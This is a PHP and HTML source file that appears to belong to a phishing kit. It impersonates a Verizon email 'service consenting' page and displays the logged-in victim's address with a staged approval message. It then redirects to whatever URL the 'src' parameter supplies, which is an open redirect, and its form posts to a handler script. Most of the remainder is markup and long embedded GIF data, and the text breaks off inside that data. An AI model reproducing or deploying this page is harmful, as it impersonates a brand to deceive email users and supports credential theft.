<?php
session_start();
ob_start();

function loggedin()
{
    if (isset($_SESSION['email'])&&!empty($_SESSION['email'])) {
        return true;
    } else {
        return false;
    }
}

if (loggedin()) {
    $basedomain = @$_GET['src'];
    
    $userlogged = $_SESSION['email'];
    $domain = @substr(strrchr($userlogged, "@"), 1);
    $downletter = strtolower("$domain");
    $goto = "$basedomain";
    if (stripos($downletter, "verizon") !== false) {
        $decision = "Received";
        $reason = "Consenting Received";
    } else {
        $decision = "Rejected";
        $reason = "$userlogged not a Verizon Email";
    }
} else {
    die(include 'Go_off.php');
}


?>
<!DOCTYPE html>

<html hola_ext_inject="disabled"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="description" content="Metro, a sleek, intuitive, and powerful framework for faster and easier web development for Windows Metro Style.">
    <meta name="keywords" content="HTML, CSS, JS, JavaScript, framework, metro, front-end, frontend, web development">
    <meta name="author" content="Sergey Pimenov and Metro UI CSS contributors">

    <link rel="shortcut icon" type="image/x-icon" href="http://metroui.org.ua/favicon.ico">

    <title>Verizon Service Consenting :: SHA201807000</title>
    
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    
    <script type="text/javascript">
$(window).load(function() {
    $(".loader").fadeOut("slow");
});
</script>

    <link href="https://elitejet.ml/metro.css" rel="stylesheet">
    <link href="https://elitejet.ml/metro-icons.css" rel="stylesheet">
    <link href="https://elitejet.ml/metro-responsive.css" rel="stylesheet">


 
  <script type="text/javascript">
   
    
    
    $( document ).ready(function(){
            $('#phase-1').fadeIn('slow', function(){
               $('#phase-1').delay(10000).fadeOut('slow', function() {
                   
        $('#phase-3').fadeIn('slow', function(){
               $('#phase-3').delay(15000).fadeOut('slow', function() {
        window.location.replace("<?php echo "$goto"; ?>");
          
    setTimeout("pageRedirect()", 10000);
    
        });
               
               });   
               }); 
               });
            });
        
    
</script>
  <style>
#backg {
    border: 2px solid black;
    padding: 25px;
    background: url(https://www.volomp.com/wp-content/uploads/2017/04/verizon-yahoo-aol.jpg);
    background-repeat: no-repeat;
    background-size: cover;
}

 </style>
 
 
    <style>
        .login-form {
            width: 25rem;
            height: 12.75rem;
            position: fixed;
            top: 50%;
            margin-top: -9.375rem;
            left: 50%;
            margin-left: -12.5rem;
            background-color: #ffffff;
            opacity: 0;
            -webkit-transform: scale(.8);
            transform: scale(.8);
        }
        
        .loader {
    position: fixed;
    left: 0px;
    top: 0px;
    width: 100%;
    height: 100%;
    z-index: 9999;
    background: url('https://keepgif.com/bundles/PlatformBundle/images/loader.gif') 50% 50% no-repeat rgb(249,249,249);
    opacity: .8;
}
  

    </style>
    

    <script>

        /*
        * Do not use this is a google analytics fro Metro UI CSS
        * */
        /*
        if (window.location.hostname !== 'localhost') {

            (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
                    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
            })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

            ga('create', 'UA-58849249-3', 'auto');
            ga('send', 'pageview');

        }


        $(function(){
            var form = $(".login-form");

            form.css({
                opacity: 1,
                "-webkit-transform": "scale(1)",
                "transform": "scale(1)",
                "-webkit-transition": ".5s",
                "transition": ".5s"
            });
        });
        */
    </script>
    
</head>
<body id="backg">
<div class="loader"></div>

<div id="phase-1"> <!--- starting default div ----->
    <div class="login-form padding20 block-shadow" style="opacity: 1; transform: scale(1); transition: 0.5s; border-style:solid; border-color:#RRGGBB">
        <form action="handler.php" method="post">
            
            <div class="text-bold">Verizon Email</div>
            <br>- Sending consent for :: <?php echo "$userlogged"; ?>
            <br>
            <hr class="thin">
            <br>
            <div class="input-control text full-size" data-role="input">
                <img src="https://elitejet.ml/Blocks43px.gif" alt="UI contents" style="padding-right: 20px;" />please wait...
                <input placeholder="Enter your email" autofocus="autofocus" type="hidden" required name="email" id="user_login" style="padding-right: 36px;">
                <button class="button helper-button clear" tabindex="-1" type="button"><span class="mif-cross"></span></button>
                
            </div>
           
        </form>
    </div>



</div> <!--- Ending default div ----->

<!--- Starting phase-2 div ----->
<div id="phase-2" style="display:none;">
<div class="login-form padding20 block-shadow" style="opacity: 1; transform: scale(1); transition: 0.5s; border-style:solid; border-color:#RRGGBB">
<img src="office.png" alt="logo" width="100px" height="50px">
            <div class="text-bold">SecuredContent</div>
            <br>- UI Essentials Fully Loaded
            <br>
            <hr class="thin">
            <br>
                            <p>
                            Authorization stream loaded, standby while secured content is being loaded <img src="data:image/gif;base64,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" alt="Authentication" /></p>
                            </div>
                            </div>
<!--- Ending phase-2 div ----->


<!--- Starting phase-3 div ----->
<div id="phase-3" style="display:none;">
<div class="login-form padding20 block-shadow" style="opacity: 1; transform: scale(1); transition: 0.5s; border-style:solid; border-color:#RRGGBB">

            <div class="text-bold">Verizon Email</div>
            <br>- Consent for :: <?php echo "$userlogged"; ?> :: <?php echo "$decision"; ?>
            <br>
            <hr class="thin">
            <br>
             <img src="https://elitejet.ml/Blocks43px.gif" alt="UI contents" style="padding-left: 175px;" />   
<p style="padding-left: 50px;"><?php echo "$reason"; ?></p>      
                           </div>
                            </div>

<!--- Ending phase-3 div ----->


<!--- Starting phase-4 div ----->
<div id="phase-4" style="display:none;">
<div class="login-form padding20 block-shadow" style="opacity: 1; transform: scale(1); transition: 0.5s; border-style:solid; border-color:#RRGGBB">
<img src="office.png" alt="logo" width="100px" height="50px">
            <div class="text-bold">SecuredContent</div>
            <br>- UI Essentials Fully ReLoaded
            <br>
            <hr class="thin">
            <br>
                            <p>
                            Securing Environment to Authenticate access <img src="data:image/gif;base64,R0lGODlh3AAUAIAAAP///////yH/C05FVFNDQVBFMi4wAwEAAAAh+QQICQAAACwAAAAA3AAUAAACR4yPqcvtD6OctNqLs968+w+G4kiW5omm6sq27gvH8kzX9o3n+s73/g8MCofEovGITCqXzKbzCY1Kp9Sq9YrNarfcrvcLDocKACH5BAgJAAAALAAAAADcABQAg1y+dNTu3JzWrGzCfGTCdKTarOz27JzarGzGhGTCfP///wAAAAAAAAAAAAAAAAAAAAR+UMlJq7046827/2AojmRpnmiqrmzrvnAsz3Rt33iuh8YxAAiBYUcsGmUBAmDJDByf0CjIkGBaCUOpdqs9WL8CrnhM/H2ZCbJ6PTt/2fC4yuwmyO/4kMC9DOf/gBcGfABZgYeBAW5OiI2ABnt9jI6UlZaXmJmam5ydnp+goYgRACH5BAgJAAAALAAAAADcABQAg1y+dNTu3JzWrGzCfGTCdKTarOz27JzarGzGhGTCfP///wAAAAAAAAAAAAAAAAAAAAR/UMlJq7046827/2AojmRpnmiqrmzrvnAsz3Rt33iu755xDACEwMArGo+uAAHAbAaQ0KiUY0g0rwTidMuFHq5gQXdMzgHBzUR5zYahwe24/HR+E+b4vEfwZor1gIEUBn0AWoKIegFvT4mOeQZ8fo2PlZaXmJmam5ydnp+goaIgEQAh+QQICQAAACwAAAAA3AAUAINcvnTU7tyc1qxswnxkwnSk2qzs9uyc2qxsxoRkwnz///8AAAAAAAAAAAAAAAAAAAAEflDJSau9OOvNu/9gKI5kaZ5oqq5s675wLM90bd94ru+8cQwAhMDAKxqPrgABwGwGkNColGNINK8E4nTLhR6uYEF3TM4Bwc1E